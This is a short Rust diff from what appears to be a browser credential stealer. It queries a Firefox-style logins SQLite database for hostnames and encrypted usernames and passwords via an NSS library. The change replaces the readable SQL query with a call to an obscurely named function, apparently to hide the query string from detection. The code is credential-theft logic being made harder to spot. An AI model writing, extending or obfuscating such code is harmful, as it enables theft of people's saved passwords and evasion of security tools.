@@ -173,8 +173,8 @@ fn extract_from_json(nss_lib: &libloading::Library, logins_path: &Path) -> Optio
 }
 
 fn extract_logins_from_sqlite(nss_lib: &libloading::Library, conn: &Connection) -> Option<String> {
-    let query = "SELECT hostname, encryptedUsername, encryptedPassword FROM logins";
-    let mut stmt = conn.prepare(query).ok()?;
+    let query = s_gck_query_logins_sqlite();
+    let mut stmt = conn.prepare(&query).ok()?;
 
     let mut output = String::new();
     let rows = stmt.query_map([], |row| {
